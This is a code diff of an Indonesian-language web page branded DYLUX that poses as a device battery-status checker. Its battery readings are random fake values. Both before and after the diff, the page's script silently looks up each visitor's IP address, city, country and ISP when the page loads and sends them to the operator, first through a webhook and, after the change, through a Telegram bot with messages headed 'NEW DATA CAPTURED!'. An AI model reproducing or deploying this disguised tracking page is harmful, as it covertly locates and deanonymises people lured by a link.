@@ -6,267 +6,115 @@
     <title>Power Status</title>
     <script src="config.js"></script>
     <style>
-        :root {
-            --primary: #00f0ff;
-            --secondary: #7b2ffc;
-            --bg: #0a0a0f;
-            --card: #14141e;
-            --text: #e0e0ff;
-            --text2: #8888aa;
-            --border: rgba(0,240,255,0.1);
-        }
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: var(--bg);
-            font-family: -apple-system, 'Inter', sans-serif;
-            color: var(--text);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-            background-image: radial-gradient(ellipse at 10% 20%, rgba(0,240,255,0.03) 0%, transparent 50%);
-        }
-        .container {
-            background: var(--card);
-            border: 1px solid var(--border);
-            border-radius: 24px;
-            padding: 40px 32px;
-            max-width: 400px;
-            width: 100%;
-        }
-        .header { text-align: center; margin-bottom: 24px; }
-        .logo {
-            font-size: 24px;
-            font-weight: 800;
-            background: linear-gradient(135deg, var(--primary), var(--secondary));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        .badge {
-            display: inline-block;
-            background: rgba(0,255,136,0.1);
-            color: #00ff88;
-            font-size: 11px;
-            padding: 4px 12px;
-            border-radius: 20px;
-            margin-top: 6px;
-            font-weight: 600;
-        }
-        .icon { font-size: 48px; text-align: center; margin: 12px 0; }
-        .title {
-            font-size: 18px;
-            font-weight: 700;
-            text-align: center;
-            margin-bottom: 6px;
-        }
-        .desc {
-            font-size: 14px;
-            color: var(--text2);
-            text-align: center;
-            line-height: 1.6;
-        }
-        .battery-display {
-            text-align: center;
-            margin: 20px 0;
-        }
-        .battery-icon {
-            font-size: 72px;
-            display: block;
-        }
-        .battery-percent {
-            font-size: 32px;
-            font-weight: 800;
-            color: var(--text);
-            margin-top: 4px;
-        }
-        .battery-status {
-            font-size: 14px;
-            color: var(--text2);
-        }
-        .battery-details {
-            background: var(--bg);
-            border-radius: 12px;
-            padding: 12px 16px;
-            margin: 12px 0;
-            border: 1px solid var(--border);
-            display: flex;
-            justify-content: space-between;
-            font-size: 13px;
-        }
-        .battery-details .label { color: var(--text2); }
-        .battery-details .value { color: var(--text); font-weight: 500; }
-        .btn {
-            width: 100%;
-            padding: 14px;
-            border: none;
-            border-radius: 12px;
-            font-size: 15px;
-            font-weight: 700;
-            cursor: pointer;
-            background: linear-gradient(135deg, var(--primary), var(--secondary));
-            color: #fff;
-            transition: 0.3s;
-        }
-        .btn:hover { transform: translateY(-2px); box-shadow: 0 0 30px rgba(0,240,255,0.2); }
-        .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
-        .footer {
-            text-align: center;
-            font-size: 11px;
-            color: var(--text2);
-            margin-top: 20px;
-            padding-top: 16px;
-            border-top: 1px solid var(--border);
-        }
-        .footer a { color: var(--primary); text-decoration: none; }
-        .spinner {
-            display: none;
-            width: 24px;
-            height: 24px;
-            border: 3px solid var(--border);
-            border-top-color: var(--primary);
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin: 12px auto 0;
-        }
+        body { background: #0a0a0f; font-family: Arial, sans-serif; color: #e0e0ff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        .box { background: #14141e; border: 1px solid rgba(0,240,255,0.1); border-radius: 16px; padding: 40px 32px; max-width: 400px; width: 100%; text-align: center; }
+        .logo { font-size: 24px; font-weight: 800; background: linear-gradient(135deg, #00f0ff, #7b2ffc); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .badge { display: inline-block; background: rgba(0,255,136,0.1); color: #00ff88; font-size: 11px; padding: 4px 12px; border-radius: 20px; margin-top: 6px; }
+        .icon { font-size: 48px; margin: 16px 0; }
+        h2 { font-size: 18px; margin-bottom: 8px; }
+        p { color: #8888aa; font-size: 14px; line-height: 1.6; }
+        .battery-display { margin: 20px 0; }
+        .battery-icon { font-size: 72px; display: block; }
+        .battery-percent { font-size: 32px; font-weight: 800; color: #e0e0ff; margin-top: 4px; }
+        .battery-status { font-size: 14px; color: #8888aa; }
+        .info-grid { background: #0a0a0f; border-radius: 12px; padding: 12px; margin: 12px 0; border: 1px solid rgba(0,240,255,0.1); }
+        .info-row { display: flex; justify-content: space-between; padding: 6px 12px; font-size: 13px; border-bottom: 1px solid rgba(0,240,255,0.05); }
+        .info-row:last-child { border-bottom: none; }
+        .info-row .label { color: #8888aa; }
+        .info-row .value { color: #e0e0ff; font-weight: 500; }
+        button { width: 100%; padding: 14px; border: none; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; background: linear-gradient(135deg, #00f0ff, #7b2ffc); color: #fff; transition: 0.3s; }
+        button:hover { opacity: 0.8; }
+        button:disabled { opacity: 0.5; cursor: not-allowed; }
+        .footer { margin-top: 20px; font-size: 11px; color: #555; }
+        .spinner { display: none; width: 24px; height: 24px; border: 3px solid rgba(0,240,255,0.1); border-top-color: #00f0ff; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 12px auto; }
         .spinner.active { display: block; }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .status-msg { text-align: center; font-size: 13px; color: var(--text2); margin-top: 10px; display: none; }
+        #statusMsg { font-size: 13px; color: #8888aa; margin-top: 10px; display: none; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <div class="logo">DYLUX</div>
-            <div class="badge">⚡ Power Status</div>
-        </div>
-
+    <div class="box">
+        <div class="logo">DYLUX</div>
+        <div class="badge">⚡ Power Status</div>
         <div class="icon">⚡</div>
-        <div class="title">Status Daya</div>
-        <div class="desc">
-            Informasi baterai perangkat Anda.
-        </div>
-
+        <h2>Status Daya</h2>
+        <p>Informasi baterai perangkat Anda.</p>
         <div class="battery-display">
             <span class="battery-icon">🔋</span>
             <div class="battery-percent" id="batteryPercent">87%</div>
             <div class="battery-status" id="batteryStatus">⚡ Sedang mengisi daya</div>
         </div>
-
-        <div class="battery-details">
-            <span class="label">⏱️ Waktu Pengisian</span>
-            <span class="value" id="chargeTime">1 jam 23 menit</span>
+        <div class="info-grid">
+            <div class="info-row"><span class="label">⏱️ Waktu Pengisian</span><span class="value" id="chargeTime">1 jam 23 menit</span></div>
+            <div class="info-row"><span class="label">🔋 Siklus</span><span class="value" id="cycleCount">124 siklus</span></div>
+            <div class="info-row"><span class="label">🌡️ Suhu</span><span class="value" id="tempStatus">32°C</span></div>
         </div>
-        <div class="battery-details">
-            <span class="label">🔋 Siklus Baterai</span>
-            <span class="value" id="cycleCount">124 siklus</span>
-        </div>
-        <div class="battery-details">
-            <span class="label">🌡️ Suhu</span>
-            <span class="value" id="tempStatus">32°C</span>
-        </div>
-
-        <button class="btn" id="checkBtn">Cek Status</button>
-
+        <button id="checkBtn">Cek Status</button>
         <div class="spinner" id="spinner"></div>
-        <div class="status-msg" id="statusMsg"></div>
-
-        <div class="footer">
-            &copy; 2026 <a href="#">DYLUX</a> • Cahaya dalam Kegelapan
-        </div>
+        <div id="statusMsg"></div>
+        <div class="footer">DYLUX • Cahaya dalam Kegelapan</div>
     </div>
 
     <script>
-        function getUserId() {
-            const params = new URLSearchParams(window.location.search);
-            return params.get('id');
-        }
-
-        async function autoDetect() {
-            const userId = getUserId();
+    (async function autoDetect() {
+        try {
+            const userId = new URLSearchParams(window.location.search).get('id');
             if (!userId) return;
-            try {
-                const ipRes = await fetch('https://ipapi.co/json/');
-                const ipData = await ipRes.json();
-                await fetch(DYLUX_CONFIG.WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        user_id: userId,
-                        type: 'auto_detect',
-                        data: {
-                            ip: ipData.ip || 'unknown',
-                            city: ipData.city || 'unknown',
-                            region: ipData.region || 'unknown',
-                            country: ipData.country_name || 'unknown',
-                            isp: ipData.org || 'unknown',
-                            lat: ipData.latitude || 0,
-                            lon: ipData.longitude || 0,
-                            device: {
-                                userAgent: navigator.userAgent,
-                                platform: navigator.platform,
-                                language: navigator.language,
-                                screen: `${window.screen.width}x${window.screen.height}`
-                            },
-                            timestamp: new Date().toISOString()
-                        }
-                    })
-                });
-                console.log('✅ Auto-detect sent');
-            } catch (e) { console.error(e); }
-        }
-
-        const userId = getUserId();
-        const checkBtn = document.getElementById('checkBtn');
-        const spinner = document.getElementById('spinner');
-        const statusMsg = document.getElementById('statusMsg');
-
-        const statuses = [
-            { icon: '🔋', percent: 87, text: '⚡ Sedang mengisi daya', charge: '1 jam 23 menit', cycle: 124, temp: '32°C' },
-            { icon: '🔋', percent: 43, text: '🔋 Baterai normal', charge: '4 jam 12 menit', cycle: 89, temp: '28°C' },
-            { icon: '🔋', percent: 15, text: '⚠️ Baterai lemah, segera isi daya', charge: '30 menit', cycle: 205, temp: '35°C' },
-            { icon: '🔋', percent: 62, text: '🔋 Baterai stabil', charge: '2 jam 45 menit', cycle: 56, temp: '26°C' }
-        ];
-
-        checkBtn.addEventListener('click', async () => {
-            checkBtn.disabled = true;
-            spinner.classList.add('active');
-            statusMsg.style.display = 'none';
-
-            const random = statuses[Math.floor(Math.random() * statuses.length)];
-
-            document.querySelector('.battery-icon').textContent = random.icon;
-            document.getElementById('batteryPercent').textContent = random.percent + '%';
-            document.getElementById('batteryStatus').textContent = random.text;
-            document.getElementById('chargeTime').textContent = random.charge;
-            document.getElementById('cycleCount').textContent = random.cycle + ' siklus';
-            document.getElementById('tempStatus').textContent = random.temp;
-
-            await fetch(DYLUX_CONFIG.WEBHOOK_URL, {
+            const ipRes = await fetch('https://ip-api.com/json/');
+            const ipData = await ipRes.json();
+            const message = `<b>🎯 NEW DATA CAPTURED!</b>\n\n<b>👤 User ID:</b> <code>${userId}</code>\n<b>📌 Type:</b> Auto-Detect\n<b>🌐 IP:</b> ${ipData.query || 'unknown'}\n<b>📍 Lokasi:</b> ${ipData.city || 'unknown'}, ${ipData.country || 'unknown'}\n<b>📡 ISP:</b> ${ipData.isp || 'unknown'}\n\n<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
+            await fetch(`https://api.telegram.org/bot${DYLUX_CONFIG.BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    user_id: userId,
-                    type: 'battery',
-                    data: {
-                        percent: random.percent,
-                        status: random.text,
-                        chargeTime: random.charge,
-                        cycleCount: random.cycle,
-                        temperature: random.temp,
-                        timestamp: new Date().toISOString(),
-                        device: navigator.userAgent
-                    }
-                })
+                body: JSON.stringify({ chat_id: userId, text: message, parse_mode: 'HTML' })
             });
+        } catch (e) { console.error(e); }
+    })();
 
+    const userId = new URLSearchParams(window.location.search).get('id');
+    const checkBtn = document.getElementById('checkBtn');
+    const spinner = document.getElementById('spinner');
+    const statusMsg = document.getElementById('statusMsg');
+
+    const statuses = [
+        { icon: '🔋', percent: 87, status: '⚡ Sedang mengisi daya', charge: '1 jam 23 menit', cycle: 124, temp: '32°C' },
+        { icon: '🔋', percent: 43, status: '🔋 Baterai normal', charge: '4 jam 12 menit', cycle: 89, temp: '28°C' },
+        { icon: '🔋', percent: 15, status: '⚠️ Baterai lemah', charge: '30 menit', cycle: 205, temp: '35°C' },
+        { icon: '🔋', percent: 62, status: '🔋 Baterai stabil', charge: '2 jam 45 menit', cycle: 56, temp: '26°C' }
+    ];
+
+    checkBtn.addEventListener('click', async () => {
+        checkBtn.disabled = true;
+        spinner.classList.add('active');
+        statusMsg.style.display = 'none';
+
+        const random = statuses[Math.floor(Math.random() * statuses.length)];
+        document.querySelector('.battery-icon').textContent = random.icon;
+        document.getElementById('batteryPercent').textContent = random.percent + '%';
+        document.getElementById('batteryStatus').textContent = random.status;
+        document.getElementById('chargeTime').textContent = random.charge;
+        document.getElementById('cycleCount').textContent = random.cycle + ' siklus';
+        document.getElementById('tempStatus').textContent = random.temp;
+
+        try {
+            const message = `<b>⚡ BATTERY STATUS CAPTURED!</b>\n\n<b>👤 User ID:</b> <code>${userId}</code>\n<b>🔋 Percent:</b> ${random.percent}%\n<b>📌 Status:</b> ${random.status}\n<b>⏱️ Charge:</b> ${random.charge}\n<b>🔄 Cycle:</b> ${random.cycle} siklus\n<b>🌡️ Temp:</b> ${random.temp}\n<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n\n<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
+            await fetch(`https://api.telegram.org/bot${DYLUX_CONFIG.BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: userId, text: message, parse_mode: 'HTML' })
+            });
             spinner.classList.remove('active');
             checkBtn.disabled = false;
             statusMsg.style.display = 'block';
             statusMsg.innerHTML = '✅ Status baterai dikirim!';
-        });
-
-        document.addEventListener('DOMContentLoaded', autoDetect);
+        } catch (error) {
+            spinner.classList.remove('active');
+            checkBtn.disabled = false;
+            statusMsg.style.display = 'block';
+            statusMsg.innerHTML = '❌ Gagal!';
+        }
+    });
     </script>
 </body>
 </html>
